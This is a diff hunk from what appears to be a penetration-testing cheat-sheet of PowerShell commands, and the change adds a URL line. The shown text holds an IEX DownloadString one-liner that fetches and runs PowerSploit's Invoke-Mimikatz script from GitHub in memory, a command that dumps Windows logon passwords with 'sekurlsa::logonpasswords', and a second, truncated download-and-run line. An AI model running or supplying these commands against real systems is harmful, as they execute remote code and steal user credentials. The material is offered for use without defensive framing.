@@ -25,6 +25,9 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubuserconte
 
 Mimikatz
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+
 Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'
 
 
